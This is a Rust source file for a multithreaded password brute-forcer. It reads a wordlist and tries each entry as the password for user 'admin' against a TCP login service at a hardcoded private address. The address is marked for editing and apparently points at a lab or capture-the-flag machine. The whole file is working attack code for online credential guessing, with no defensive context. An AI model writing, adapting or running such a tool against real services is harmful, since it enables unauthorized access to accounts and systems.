
use std::io::{BufReader, Read, Write};
use std::net::TcpStream;
use std::fs;
use std::path::Path;
use std::io::BufRead;
use threadpool::ThreadPool;
use std::env;
fn send_data(password: &str) {
    let mut fd = TcpStream::connect("10.10.238.26:8000").expect("Cannot connect"); // Modify Me!!!!

    fd.write_all(b"admin").expect("Cannot send message");

    let mut buffer = [0; 512]; // Adjust size as needed

    // Receive data from the server
    match fd.read(&mut buffer) {
        Ok(bytes_read) => {
            let readed_data = String::from_utf8_lossy(&buffer[..bytes_read]).trim().to_string();  
            if readed_data == "Password:" {
                fd.write_all(password.as_bytes()).expect("Cannot send message");
                
                let mut buffer_pass = [0; 512]; 
                let size = fd.read(&mut buffer_pass).expect("Cannot read the response from the password");
                let readed_data_from_pass = String::from_utf8_lossy(&buffer_pass[..size]).trim().to_string(); 
                println!("Testing the password: {}", password);
                if readed_data_from_pass != "Password:" {
                    println!("We got it: {}", password);
                }
            }
        }
        Err(e) => {
            eprintln!("Failed to receive data: {}", e);
        }
    }
}
fn print_help() {
    println!("Usage: <program_name> <wordlist_path> [-t <thread_number>]");
    println!("Options:");
    println!("  -t <thread_number>   Specify the number of threads (default is 20)");
}

fn main() {
    let vars: Vec<String> = env::args().collect();

    if vars.len() < 2 {
        eprintln!("Error: No wordlist path provided.");
        print_help();
        std::process::exit(1);
    }
    println!("The file is {}", vars[1]);

    let path = Path::new(&vars[1]);
    let file = fs::File::open(path).expect("Cannot open the file");
    let reader = BufReader::new(file);

    let mut thread_number: i32 = 20;

    if vars.len() > 3 && vars[2] == "-t" {
        thread_number = vars[3].trim().parse().expect("Please enter a valid integer");
    } else {
        println!("No thread number was provided, using the default: 20");
    }

    let thread_pool = ThreadPool::new(thread_number as usize);

    for line in reader.lines() {
        thread_pool.execute(move || {
            if let Ok(password) = line {
                send_data(&password);
            }
        });
    }

    thread_pool.join();
}
